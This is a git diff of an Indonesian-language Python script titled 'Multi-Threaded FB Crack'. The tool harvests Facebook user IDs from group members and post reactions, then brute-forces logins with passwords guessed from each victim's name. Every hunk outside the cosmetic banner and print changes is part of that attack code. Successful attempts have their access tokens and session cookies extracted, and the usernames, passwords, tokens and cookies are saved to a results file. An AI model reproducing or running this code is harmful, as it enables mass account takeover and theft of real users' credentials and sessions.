@@ -9,12 +9,12 @@ import threading
 from concurrent.futures import ThreadPoolExecutor
 from iden import BloksIdentityEngine, FacebookRSAEncrypter
 import requests
+
 I = '\033[1;92m'
 M = '\033[1;91m'
 K = '\033[1;93m'
 P = '\033[1;97m'
 U = '\033[1;95m'
-
 
 class CrackMassal:
     def __init__(self):
@@ -26,32 +26,17 @@ class CrackMassal:
         self.cracked_uids = set()
         self.mesin = BloksIdentityEngine()
         self.enc = FacebookRSAEncrypter()
-
     def banner(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         print(f"""{U}
-                  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
-                 ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
-                 ██║     ██████╔╝███████║██║     █████╔╝ 
-                 ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
-                 ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
-                  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-                 {P}Multi-Threaded FB Crack - Author by Dezz
+               ██████╗██████╗  █████╗  ██████╗██╗  ██╗
+              ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+              ██║     ██████╔╝███████║██║     █████╔╝ 
+              ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
+              ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
+               ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+              {P}Multi-Threaded FB Crack - Author by Dezz
         """)
-
-    def render_panel(self, status, uid, name, password, cookies, ua):
-        col = I if status == "OK" else K
-        txt = "BERHASIL LOGIN" if status == "OK" else "CHECKPOINT"
-        print(f"\n{col}┌───────────────────────────────────────────────────────────┐")
-        print(f"{col}│{P}{txt.center(59)}{col}│")
-        print(f"{col}├───────────────────────────────────────────────────────────┤")
-        print(f"{col}│ {P}NAMA       : {I}{name}")
-        print(f"{col}│ {P}ID         : {I}{uid}")
-        print(f"{col}│ {P}PASSWORD   : {I}{password}")
-        print(f"{col}│ {P}COOKIE     : {I}{cookies[:45]}...")
-        print(f"{col}│ {P}USER AGENT : {I}{ua[:45]}...")
-        print(f"{col}└───────────────────────────────────────────────────────────┘\n")
-
     def generate_passwords(self, name, manual_passwords, metode=1):
         pw_list = []
         if name:
@@ -84,13 +69,11 @@ class CrackMassal:
         if not pw_list:
             pw_list = ["123456"]
         return pw_list
-
     def save_result(self, folder, filename, data):
         if not os.path.exists(folder): os.makedirs(folder, exist_ok=True)
         with open(f"{folder}/{filename}", "a", encoding="utf-8") as f:
             f.write(data + "\n")
-
-    def parse_success(self, res_text, uid, name, password):
+    def parse_success(self, res_text, uid, name, password, ua):
         token = "Tidak Ditemukan"
         cookies = "Tidak Ditemukan"
         token_match = re.search(r'(EAAB[a-zA-Z0-9]+)', res_text)
@@ -104,10 +87,15 @@ class CrackMassal:
                     if n in ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]:
                         clist.append(f"{n}={v}")
                 cookies = "; ".join(clist) + ";"
-        self.render_panel("OK", uid, name, password, cookies, self.mesin.user_agent)
+        print(f"\n{I} ┌───────────────────── BERHASIL LOGIN ─────────────────────┐")
+        print(f" │{P} NAMA       : {I}{name}")
+        print(f" │{P} ID         : {I}{uid}")
+        print(f" │{P} PASSWORD   : {I}{password}")
+        print(f" │{P} COOKIEE    : {I}{cookies}")
+        print(f" │{P} USER AGENT : {K}{ua}")
+        print(f"{I} └──────────────────────────────────────────────────────────┘{P}")
         self.save_result("Results", "OK.txt", f"{uid}|{password}|{token}|{cookies}")
         self.ok += 1
-
     def login(self, uid, name, pw):
         if uid in self.cracked_uids:
             return
@@ -121,10 +109,15 @@ class CrackMassal:
             resp = res.text
             if "access_token" in resp:
                 self.cracked_uids.add(uid)
-                self.parse_success(resp, uid, name, pw)
+                self.parse_success(resp, uid, name, pw, m.user_agent)
             elif "checkpoint" in resp.lower():
                 self.cracked_uids.add(uid)
-                self.render_panel("CP", uid, name, pw, "Checkpoint Detected", self.mesin.user_agent)
+                print(f"\n{K} ┌───────────────────── AKUN CHECKPOINT ─────────────────────┐")
+                print(f" │{P} NAMA       : {name}")
+                print(f" │{P} ID         : {uid}")
+                print(f" │{P} PASSWORD   : {pw}")
+                print(f" │{P} STATUS     : {M}CHECKPOINT (Sesi Terkunci)")
+                print(f"{K} └──────────────────────────────────────────────────────────┘{P}")
                 self.save_result("Results", "CP.txt", f"{uid}|{pw}")
                 self.cp += 1
             elif "e53" in resp.lower() or "error_message" in resp.lower():
@@ -132,8 +125,7 @@ class CrackMassal:
         except Exception:
             pass
         self.loop += 1
-        print(f"\r{P} -> {self.loop}/{total_check} OK:-:{I}{self.ok}{P} CP:-:{K}{self.cp}{P} A2F:-:{U}0{P} {uid}", end="")
-
+        print(f"\r {P}{self.loop}/{total_check} OK-:{I}{self.ok}{P} CP-:{K}{self.cp}{P} {uid} ", end="")
     def start(self, target_file=None):
         self.banner()
         print(f"\n{P}[*] Daftar password yang otomatis dicek:")
@@ -167,7 +159,7 @@ class CrackMassal:
             pil_metode = 1
         print(f"[*] Menggunakan Metode: {pil_metode}")
         if pil_metode == 3:
-            pw_input = input(f"{P}[?] Masukkan Password Custom (misal: gans,007,cakep): ")
+            pw_input = input(f"{P}[?] Masukkan Suffix Custom (misal: gans,007,cakep): ")
         else:
             pw_input = input(f"{P}[?] Masukkan Password Tambahan (Opsional, pisahkan koma): ")
         self.passwords = [p.strip() for p in pw_input.split(",") if p.strip()]
@@ -191,7 +183,6 @@ class CrackMassal:
         print(f"\n\n{I}[ DONE / SELESAI ]")
         print(f"{I}[+] Akun OK: {self.ok} ( hasil disimpan di Results/OK.txt )")
         print(f"{K}[+] Akun CP: {self.cp} ( hasil disimpan di Results/CP.txt )")
-
 
 class AuthManager:
     COOKIE_FILE = "saved_cookie.txt"
@@ -253,7 +244,6 @@ class AuthManager:
                 print(f"{M}[!] Token diperlukan!")
                 sys.exit()
         return cookie, token
-
 
 class GroupDumper:
     def __init__(self, cookie, token):
@@ -329,7 +319,6 @@ class GroupDumper:
             print(f"\n{M}[!] Error: {e}")
         print(f"\n{I}[*] Dump Selesai! Tersimpan di: {fname} (Total: {self.total})")
         return fname
-
 
 class ReactionDumper:
     def __init__(self, cookie, token):
@@ -414,7 +403,6 @@ class ReactionDumper:
         print(f"\n{I}[*] Dump Selesai! Tersimpan di: {fname} (Total: {self.total})")
         return fname
 
-
 def main():
     cookie, token = AuthManager.login()
     while True:
@@ -442,5 +430,6 @@ def main():
             CrackMassal().start()
         else:
             print(f"{M}[!] Pilihan tidak valid.")
+
 if __name__ == "__main__":
     main()
